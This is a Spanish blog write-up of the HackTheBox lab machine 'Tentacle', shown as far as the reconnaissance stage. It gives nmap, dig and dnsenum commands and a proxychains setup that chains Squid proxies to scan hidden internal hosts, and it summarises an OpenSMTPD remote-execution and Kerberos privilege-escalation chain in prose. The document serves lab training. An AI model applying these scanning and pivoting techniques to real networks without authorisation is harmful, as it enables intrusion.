---
layout      : post
title       : "HackTheBox - Tentacle"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310banner.png
categories  : [ htb ]
tags        : [ kerberos, proxychains, SMTP, squid-proxy ]
---
Máquina Linux nivel difícil (pareció insana eh!). Nos toparemos con varios dominios escondidos, jugaremos con **proxychains** para encadenarnos, enumeraremos IPs fantasmas y explotaremos una de ellas que esta corriendo **OpenSMTPD**. Seguiremos saltando ahora con **Kerberos**, jugaremos, moveremos, modificaremos y crearemos cositas con él para ser **root**.

![310tentacle](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310tentacle.png)

### TL;DR (Spanish writeup)

**Creada por**: [polarbearer](https://app.hackthebox.eu/users/159204).

Bueno bueno, vamo a juga...

Locura de máquina, inicialmente exploraremos con `dig` y `dnsenum` para encontrar unos dominios (jugando con wordlist). Al tener un proxy en la máquina tendremos que usarlo para saltar a nuevos proxys (relacionados con los dominios que encontramos), nos apoyaremos de `proxychains` para esta tarea. Jugaremos con él para ejecutar escaneos con `nmap` sobre cada una de las redes que nos vamos encontrando. Finalmente llegaremos a un host el cual tiene el puerto **80** abierto, usando fuzz encontraremos un archivo de configuración `wpad.dat` el cual contiene los segmentos que se le deben asignar a los clientes cuando se conecten a la red. De ese archivo tendremos un nuevo segmento de IPs, usando `nmap` veremos cuáles están activas y que puertos están corriendo. 

Nos toparemos con una máquina que esta sirviendo el puerto **25** (SMTP) con el software **OpenSMTPD** el cual tiene una vulnerabilidad de ejecución remota de comandos, nos aprovecharemos de ella para establecer una Reverse Shell en la máquina `smtp`, todo esto mediante `proxychains`.

Estando en la máquina `smtp` (como **root**) nos encontraremos un archivo de configuración **SMTP**, tiene unas credenciales que nos servirán para logearnos como el usuario **j.nawazaka** en el servidor *host*... Pero para ejecutar esta tarea nos apoyaremos del servicio `kerberos`, generaremos los respectivos dominios y servidores, asi mismo generaremos el **ticket granting-ticket** para poder establecer la conexión e ingresar al sistema... Despues de este proceso tendremos una Shell mediante `SSH` como el usuario **j.nakazawa** en el servidor host.

Debemos pivotear al usuario **admin**, enumerando veremos que hay un script el cual genera un backup de todo el contenido de la ruta `/var/log/squid/` sobre la ruta `/home/admin`, nos aprovecharemos de esto para mediante el archivo `.k5login` agregar el usuario **j.nakazawa...** (que esta en la base de datos del servidor de `kerberos`) a la ruta `/home/admin`. Este archivo permite establecer conexión al usuario de `kerberos` sobre la sesión del usuario que contiene el archivo, en este caso el objeto quedo en el **home** de **admin**, por lo tanto usando `SSH` podremos logearnos como **admin** y obtener una sesión.

Finalmente el usuario **admin** tiene acceso a un archivo bastante interesante/peligroso (`/etc/krb5.keytab`). Jugando con los comandos de `kerberos` tendremos varios llamativos, usaremos algunos que nos permitirán jugar con los "target principal name" para asi crear como "target principal" al usuario **root**. Esto nos permitirá obtener una Shell como el usuario **root** sobre el sistema.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Enumeración a tope peeeero más o menos real 😕

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento Lateral](#movimiento-lateral).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Realizaremos un escaneo de puertos para saber que servicios esta corriendo la máquina:

```bash
❭ nmap -p- --open -v -Pn 10.10.10.224 -oG allScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escaneamos todos los 65535 puertos.                     |
| --open    | Solo los puertos que estén abiertos.                    |
| -v        | Permite ver en consola lo que va encontrando (verbose). |
| -Pn       | Evita hacer host discovery (ping)                       |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me permite extraer los puertos y guardarlos en la clipboard, esto para evitar copiar uno a uno (en caso de tener muchos) a mano en nuestro siguiente escaneo. |

Pero este escaneo va muyyyyyyyyyyyyy lento, agreguémosle el parámetro `--min-rate` para que nos envíe X numero de paquetes (el que le pongamos) por cada petición.

> Con este escaneo podemos perdernos puertos, por lo tanto es mejor tambien correr el escaneo anterior sin el `min-rate`. En un momento veremos el resultado.

```bash
❭ nmap -p- --open -v -Pn --min-rate=2000 10.10.10.224 -oG initScan
```

Va más rápido y obtenemos:

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Tue Mar  2 25:25:25 2021 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.224
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.224 ()   Status: Up
Host: 10.10.10.224 ()   Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///      Ignored State: filtered (65533)
# Nmap done at Tue Mar  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71.05 seconds
```

Perfecto, nos encontramos los servicios:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Acceso remoto a servidores por medio de un canal seguro. |
| 53     | **[DNS](https://es.wikipedia.org/wiki/Sistema_de_nombres_de_dominio)**: Permite la conexión tanto TCP como UDP para comunicarnos con el DNS (Domain Name System). |

Hagamos un escaneo de scripts y versiones con base en cada puerto encontrado, con ello obtenemos información más detallada de cada servicio:

```bash
❭ nmap -p 22,53 -sC -sV -Pn 10.10.10.224 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos.                       |
| -sC       | Muestra todos los scripts relacionados con el servicio. |
| -sV       | Nos permite ver la versión del servicio.                |
| -oN       | Guarda el output en un archivo.                         |

```bash
❭ cat portScan 
# Nmap 7.80 scan initiated Tue Mar  2 25:25:25 2021 as: nmap -p 22,53 -sC -sV -Pn -oN portScan 10.10.10.224
Nmap scan report for 10.10.10.224
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp open  domain  ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
Service Info: OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15.66 seconds
```

Entonces, tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.0 (protocol 2.0)                   |
| 53     | DNS      | ISC BIND 9.11.20 (RedHat Enterprise Linux 8) |

...

Validando el escaneo total (sin `min-rate`) nos encontramos nuevos servicios activos:

```bash
❭ nmap -p- --open -v -Pn 10.10.10.224 -oG allScan
```

```bash
❭ cat allScan
# Nmap 7.80 scan initiated Tue Mar  2 25:25:25 2021 as: nmap -p- --open -v -Pn -oG allScan 10.10.10.224
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.224 ()   Status: Up
Host: 10.10.10.224 ()   Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 3128/open/tcp//squid-http///
# Nmap done at Tue Mar  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 1725.50 seconds
```

Hagamos el escaneo de versiones y relacionamos lo que encontramos:

```bash
❭ nmap -p 22,53,88,3128 -sC -sV -Pn 10.10.10.224 -oN allPortScan
```

```bash
❭ cat allPortScan 
# Nmap 7.80 scan initiated Tue Mar  2 25:25:25 2021 as: nmap -p 22,53,88,3128 -sC -sV -Pn -oN allPortScan 10.10.10.224
Nmap scan report for 10.10.10.224
Host is up (0.12s latency).

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-03-02 18:35:11Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 28.08 seconds
```

Ahora si, que tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH         | OpenSSH 8.0 (protocol 2.0)                   |
| 53     | DNS         | ISC BIND 9.11.20 (RedHat Enterprise Linux 8) |
| 88     | [Kerberos](https://es.wikipedia.org/wiki/Kerberos) | MIT Kerberos (Permite a dos ordenadores en una red insegura demostrar su identidad de manera segura) |
| 3128   | [Squid-Proxy](https://www.ionos.es/digitalguide/servidores/configuracion/squid-el-servidor-proxy-cache-de-codigo-abierto/) | Squid http proxy 4.11 (Servidor proxy para webs con cache) |

Que destacamos:

**Puerto 22:**

* No me había encontrado con esa versión hasta ahora, asi que puede ser interesante.

**Service Info:**

* Tenemos un dominio: `realcorp.htb`.

...

### Puerto 53 (DNS) [⌖](#puerto-53) {#puerto-53}

Hay una herramienta muy útil para cuando tenemos el puerto **DNS** accesible llamada `DIG`, podemos hacer varias cosas con ella:

> Dig (Domain Information Groper): Utility that performs DNS lookup by querying name servers and displaying the result to you. [How to use dig command](https://www.hostinger.com/tutorials/how-to-use-the-dig-command-in-linux/).

Entonces intentara buscar dominios que resuelvan a nuestro servidor

Si queremos hacer una búsqueda de todos los DNS válidos, podemos usar `ANY`:

```bash
❭ dig ANY @10.10.10.224

; <<>> DiG 9.16.2-Debian <<>> ANY @10.10.10.224
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 50996
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: e8b7300acf9dc80370fb538e603e8a54a597e579a036adfe (good)
;; QUESTION SECTION:
;.                              IN      NS

;; Query time: 115 msec
;; SERVER: 10.10.10.224#53(10.10.10.224)
;; WHEN: mar mar 02 25:25:25 -05 2021
;; MSG SIZE  rcvd: 56
```

De acá nos damos cuenta de que esta respondiéndonos con una `cookie`, pero no tenemos nada más... Con los demás argumentos obtenemos lo mismo solo que la cookie va cambiando.

Buscando por internet más formas de enumerar el puerto `DNS` nos encontramos con este post sobre algunas herramientas y en el que se toca sobre `dnsenum` que nos ayuda a efectuar lo mismo que `dig`, pero también tiene la utilidad de encontrar subdominios que no están expuestos.

* [Articulo del que me guie para usarlo](https://linuxhint.com/dns_reconnaissance_linux/).
* [Como usar **dnsenum** en linux](http://www.reydes.com/d/?q=DNSenum).

Su uso básico seria:

```bash
❭ dnsenum realcorp.htb -f /usr/share/dirbuster/wordlists/directories.jbrofuzz
```

Donde le pasamos el dominio y una wordlist para que vaya probando. Pero esta ejecucion nos da error porque no entiende hacia donde responde el dominio `realcorp.htb`

```bash
❭ dnsenum realcorp.htb -f /usr/share/dirbuster/wordlists/directories.jbrofuzz
```

```bash
dnsenum VERSION:1.2.6

-----   realcorp.htb   -----


Host's addresses:
__________________



Name Servers:
______________

realcorp.htb NS record query failed: NXDOMAIN
```

Viendo las opciones de la herramienta, podemos pasarle el servidor `dns` al que hace referencia ese dominio con el argumento `--dnsserver`:

![310bash_dnsenum_without_seclist](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_dnsenum_without_seclist.png)

Vale, obtenemos un nuevo dominio e IP, pero el wordlist no nos encontró nada, intentemos modificar el wordlist por uno más especializado en fuzzing de `DNS`:

```bash
❭ dnsenum --dnsserver 10.10.10.224 realcorp.htb -f /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```

Esto toma mucho tiempo, pongámosle hilos y veamos la respuesta:

![310bash_dnsenum_with_seclist](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_dnsenum_with_seclist.png)

Perfecto, finalmente conseguimos nuevos dominios y sus respectivas IPS " ":

* `ns.realcorp.htb` -> `10.197.243.77`
* `proxy.realcorp.htb`
* `wpad.realcorp.htb` -> `10.197.243.31` (este se ve interesante, ya que es único)

Pero intentando interactuar con alguna de esas direcciones no obtenemos respuesta...

Por el momento no podemos hacer nada con estos dominios... Sigamos enumerando.

...

### Puerto 88 (Kerberos) [⌖](#puerto-88) {#puerto-88}

Si validamos en la web a ver si nos responde algo, nos damos cuenta de que al hacer la petición intenta responder con algo, pero de una vez nos indica que no hay conexión. Si somos medio rápidos :P podemos frenar la petición antes de que nos muestre que **no hay conexión** y tendríamos:

![310page88](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310page88.png)

Pues solo vemos el dominio que ya habíamos encontrado.

* `REALCORP.HTB`

Por el momento nada más...

...

### Puerto 3128 (Squid Proxy) [⌖](#puerto-3128) {#puerto-3128}

![310page3128](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310page3128.png)

Opa, este servicio nos spoilea con algunas cosas:

* Your cache administrator is `j.nakazawa@realcorp.htb`
  * Nos indica que efectivamente el dominio es `realcorp.htb`.
  * Nos da un usuario potencial.
  * Nos muestra un posible patrón de como son creados los usuarios, **`inicialnombre.apellido@dominio`** (puede que nos sirva de algo).
* Tenemos otro dominio: `srv01.realcorp.htb`

Bueno, probemos a colocar los dos dominios en el archivo `/etc/hosts` a ver si obtenemos algo diferente.

```bash
❭ cat /etc/hosts
...
10.10.10.224  realcorp.htb srv01.realcorp.htb
...
```

Pero pues seguimos obteniendo lo mismo que antes.

Esto lo solucionamos pensando un toque... ¿Para qué tenemos el proxy? Pues precisamente para evitar estos problemitas, ya que es el intermediario entre nosotros y el dominio :P 

Con `cURL` podemos ver el ejemplo perfecto. Intentemos hacer una petición hacia el dominio encontrado:

```bash
❭ curl -v http://realcorp.htb
```

```bash
* Trying 10.10.10.224:80...
* connect to 10.10.10.224 port 80 failed: No existe ninguna ruta hasta el `host'
* Failed to connect to realcorp.htb port 80: No existe ninguna ruta hasta el `host'
* Closing connection 0
curl: (7) Failed to connect to realcorp.htb port 80: No existe ninguna ruta hasta el `host'
```

No obtenemos respuesta, pero si le indicamos que queremos conectarnos al dominio peeero a través del proxy (que es el que nos permite ver ese dominio):

```bash
❭ curl -v http://realcorp.htb --proxy 10.10.10.224:3128
```

```bash
* Trying 10.10.10.224:3128...
* Connected to 10.10.10.224 (10.10.10.224) port 3128 (#0)
> GET http://realcorp.htb/ HTTP/1.1
> Host: realcorp.htb
> User-Agent: curl/7.74.0
> Accept: */*
> Proxy-Connection: Keep-Alive
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 407 Proxy Authentication Required
< Server: squid/4.11
< Mime-Version: 1.0
< Date: Tue, 02 Mar 2021 19:28:22 GMT
< Content-Type: text/html;charset=utf-8
< Content-Length: 3552
< X-Squid-Error: ERR_CACHE_ACCESS_DENIED 0
< Vary: Accept-Language
< Content-Language: en
< Proxy-Authenticate: Basic realm="Web-Proxy"
< X-Cache: MISS from srv01.realcorp.htb
< X-Cache-Lookup: NONE from srv01.realcorp.htb:3128
< Via: 1.1 srv01.realcorp.htb (squid/4.11)
< Connection: keep-alive
<
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<meta type="copyright" content="Copyright (C) 1996-2020 The Squid Software Foundation and contributors">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>ERROR: Cache Access Denied</title>
<style type="text/css"><!--
...
```

Perfecto, estamos viendo la respuesta real hacia el dominio. Nos indica **Cache Access Denied**... Validando el final de la respuesta tenemos:

```html
</head><body id=ERR_CACHE_ACCESS_DENIED>
<div id="titles">
<h1>ERROR</h1>
<h2>Cache Access Denied.</h2>
</div>
<hr>

<div id="content">
<p>The following error was encountered while trying to retrieve the URL: <a href="http://realcorp.htb/">http://realcorp.htb/</a></p>

<blockquote id="error">
<p><b>Cache Access Denied.</b></p>
</blockquote>

<p>Sorry, you are not currently allowed to request http://realcorp.htb/ from this cache until you have authenticated yourself.</p>

<p>Please contact the <a href="mailto:j.nakazawa@realcorp.htb?subject=CacheErrorInfo%20-%20ERR_CACHE_ACCESS_DENIED&amp;body=CacheHost%3A%20srv01.realcorp.htb%0D%0AErrPage%3A%20ERR_CACHE_ACCESS_DENIED%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Tue,%2002%20Mar%202021%2019%3A28%3A22%20GMT%0D%0A%0D%0AClientIP%3A%2010.10.14.135%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F7.74.0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%20realcorp.htb%0D%0A%0D%0A%0D%0A">cache administrator</a> if you have difficulties authenticating yourself.</p>

<br>
</div>

<hr> 
<div id="footer">
<p>Generated Tue, 02 Mar 2021 19:28:22 GMT by srv01.realcorp.htb (squid/4.11)</p>
<!-- ERR_CACHE_ACCESS_DENIED -->
</div>
</body></html>
```

Al parecer necesitamos estar autenticados para poder acceder a la cache ):

Jmmm, antes de seguir, intentemos ver esta respuesta en el navegador, por lo tanto vamos a configurar el proxy, en mi caso en **Firefox**:

* [Use está guía - whatismyip.com/what-is-a-proxy](https://www.whatismyip.com/what-is-a-proxy/).

![310firefox_conf_proxy](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310firefox_conf_proxy.png)

* Le decimos cuál es la IP del proxy y su puerto
* También le indicamos que dominios no queremos que los procese el proxy, tales como `.net`, `.com`, `.org`, etc...

Pero al intentar resolver hacia el dominio, se queda cargando y no obtenemos nada, intente quitándolo del archivo `/etc/hosts`, pero igualmente se queda intentando resolver... Asi que nada, nos quedamos con la respuesta de `cURL`...

Indagando nos encontramos con un exploit para la versión que tenemos de `Squid` sobre **HTTP Requests Smuggling**

* [CVE sobre la vulnerabilidad - CVE-2020-15811](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15811).
* [Lindo post para adentrarse en el **HTTP Request Smuggling**](https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/).

Pero despues de probar cositas no logramos ver esto reflejado... 

Intentando **fuzzing** no vemos nada tampoco.

...

## Movimiento lateral [#](#movimiento-lateral) {#movimiento-lateral}

En este punto estuve bastante perdido asi que decidí pedir ayuda. Me indico si había usado `proxychains`, si no, que le echará un ojo :O

...

### Proxychains [⌖](#proxy-chains) {#proxy-chains}

Teniendo en cuenta el funcionamiento de un proxy (que ya vimos con `squid`). **Proxychains** nos permite forzar cualquier conexión a que sea manipulada entre proxies, lo que significaría pivotear entre muchas IPs para que al final nuestra IP se convierta en otra totalmente diferente, esto viéndolo desde la parte del anonimato, pero hablando para el caso puntual en el que necesitamos interactuar con un servicio que si o si tiene que ser hecho mediante un proxy, acá nos puede ayudar `proxychains`, además que podemos lanzar comandos (`nmap` por ejemplo) usando la herramienta como intermediario... Démosle a la práctica...

* [Proxychains tutorial](https://linuxhint.com/proxychains-tutorial/).
* [Proxing like a pro using **proxychains**](https://medium.com/swlh/proxying-like-a-pro-cccdc177b081).

> We need to setup proxychains configuration file. We also need a list of proxy server. Proxychains configuration file located on `/etc/proxychains.conf` [Proxychains tutorial](https://linuxhint.com/proxychains-tutorial/).

Modifiquemos el archivo `/etc/proxychains.conf` según los recursos anteriores:

```bash
...
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050 #Este es la configuracion por default para usar tor. Envia nuestro trafico por el puerto 9050
#
# Proxies tentacle box
http  10.10.10.224   3128 # Proxy squid
```

Entonces ahora que ya tenemos el proxy dentro del archivo de configuración, podemos probar mediante `nmap` a ver si tenemos acceso a alguna de las IPs que encontramos o al localhost, probemos con la IP `10.91.243.31`:

```bash
❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.197.243.31 -oG proxyScan-31 2>/dev/null
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -sT        | Para que haga un escaneo de puertos y espere respuesta [(SYN/ACK)](https://nmap.org/book/scan-methods-connect-scan.html). Ya que `-p-` no me estaba dando respuesta (aunque hubiera podido usar `-sT -p- --open` pero pues no se me ocurrió en ese momento. |

```bash
❭ cat proxyScan-31 
# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oG proxyScan-31 10.197.243.31
# Ports scanned: TCP(1000) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.197.243.31 ()  Status: Up
Host: 10.197.243.31 ()  Status: Up
# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 239.78 seconds
```

Pero pues no obtenemos nada :P Si probamos el escaneo sobre el **localhost** obtenemos nuevos puertos (:

```bash
❭ cat proxyScan-127 
# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan-127 127.0.0.1
Nmap scan report for localhost (127.0.0.1)
Host is up (0.24s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 239.66 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 464    | [Kpasswd5 (Kerberos Password Change)](https://security.stackexchange.com/questions/205492/what-is-this-service#answers): Usado para cambiar/configurar passwords en un Controlador de Dominio. |
| 749    | [kerberos-adm](https://www.speedguide.net/port.php?port=749): Administracion de kerberos :P |

Pensando un rato, cai en cuenta en realmente el concepto de `proxychains` (esta explicación puede ser larga, o no, pero igual la quiero hacer, se la pueden saltar :P)

El concepto de **proxy** ya lo tenemos claro, entonces simplemente nos estamos apoyando de `proxychains` para ejecutar comandos... Peeero si nos enfocamos en su uso real (encadenar proxys) podemos **por ejemplo** pensar lo siguiente...

Hacemos la petición hacia la el dominio `realcorp.htb` mediante el proxy `10.10.10.224:3128`, ya que si la hacemos sin él, no tenemos respuesta... Ahora, con `proxychains` podemos indicarle más proxys para que vaya haciendo una cadena, entonces si le indicáramos que queremos hacer una petición a la IP `10.197.243.31` mediante el proxy `10.10.10.224:3128` pero que a su vez lo encadene con el proxy `127.0.0.1:3128` (localhost), le estaríamos indicando que "pivotee" entre proxys para saber si la ip `10.197.243.31` responde a esa cadena de proxies. El pivoting lo muestra [Vickie Li](https://medium.com/swlh/proxying-like-a-pro-cccdc177b081) en su [artículo](https://medium.com/swlh/proxying-like-a-pro-cccdc177b081):

<img src="https://miro.medium.com/max/640/1*exRPwGYJpGv6eESldShwzQ.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

(**Creo que es una excelente imagen para plasmar lo dicho, gracias [@Vickie Li](https://medium.com/swlh/proxying-like-a-pro-cccdc177b081)**).

Entonces probemos la teoría, agreguemos al archivo `/etc/proxychains.conf` el proxy `127.0.0.1:3128` (que vimos que esta abierto en el anterior escaneo) y empecemos a ejecutar hacia las IPs:

```bash
❭ cat /etc/proxychains.conf 
...
# Proxies tentacle box
http  10.10.10.224   3128 # squid proxy
http  127.0.0.1      3128 # localhost proxy
```

Ejecutamos inicialmente contra la `10.197.243.31`:

```bash
❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.197.243.31 -oN proxyScan_loc_31 2>/dev/null
```

Nada, no tenemos acceso:

```bash
❭ cat proxyScan_loc_31 
# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_31 10.197.243.31
Nmap scan report for 10.197.243.31
Host is up (0.36s latency).
All 1000 scanned ports on 10.197.243.31 are closed

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 371.44 seconds
```

Contra la `10.197.243.77`:

```bash
❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.197.243.77 -oN proxyScan_loc_77 2>/dev/null
```

```bash
❭ cat proxyScan_loc_77 
# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_77 10.197.243.77
Nmap scan report for 10.197.243.77
Host is up (0.36s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 367.15 seconds
```

Perfecto, tenemos acceso ahora a esta IP mediante la cadena de proxies y conseguimos otro proxy para concatenar:

```bash
❭ cat /etc/proxychains.conf 
...
# Proxies tentacle box
http  10.10.10.224   3128 # squid proxy
http  127.0.0.1      3128 # localhost proxy
http  10.197.243.77  3128 # .77 proxy
```

Ahora solo nos quedaria probar ante la IP `10.197.243.31` y ver si tenemos acceso:

```bash
❭ proxychains nmap -sT --min-rate=2000 -Pn -v 10.197.243.31 -oN proxyScan_loc_77_31 2>/dev/null
```

Y tedriamos:

```bash
❭ cat proxyScan_loc_77_31 
# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT --min-rate=2000 -Pn -v -oN proxyScan_loc_77_31 10.197.243.31
Nmap scan report for 10.197.243.31
Host is up (0.48s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 482.80 seconds
```

Tenemos un servicio `HTTP` sobre el puerto `80` :O Inspeccionemoslo:

```bash
❭ proxychains nmap -sT -p 80 -sC -sV -Pn -v 10.197.243.31 -oN port80Scan_loc_77_31 2>/dev/null
```

```bash
❭ cat port80Scan_loc_77_31 
# Nmap 7.80 scan initiated Wed Mar  3 25:25:25 2021 as: nmap -sT -p 80 -sC -sV -Pn -v -oN port80Scan_loc_77_31 10.197.243.31
Nmap scan report for 10.197.243.31
Host is up (0.47s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  3 25:25:25 2021 -- 1 IP address (1 host up) scanned in 25.20 seconds
```

Bien, intentemos verlo en la web:

```bash
❭ proxychains firefox 10.197.243.31
```

Pero no carga, validemos con `cURL`:

```bash
❭ proxychains curl http://10.197.243.31
```

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
                                
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<title>Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<style type="text/css">
...
...
```

Tenemos respuesta del servidor web... Estando en este punto algo debemos hacer con la web porque si no sería un gran (grandísimo) rabbit hole... Probemos a incluir la IP en nuestro archivo `/etc/hosts` de nuevo a ver si cambia algo la respuesta.

* Recuerden cuando obtuvimos esta IP, fue en la enumeración del **DNS**: `10.197.243.31` -> `wpad.realcorp.htb`

```bash
❭ cat /etc/hosts
...
10.197.243.31 wpad.realcorp.htb
...
```

Volviendo a intentar... La web tampoco carga, pero `cURL` nos responde con un **prohibido** (nos deniega el acceso):

```bash
❭ proxychains curl wpad.realcorp.htb
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<>-10.197.243.77:3128-<><>-10.197.243.31:80-<><>-OK
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.14.1</center>
</body>
</html>
```

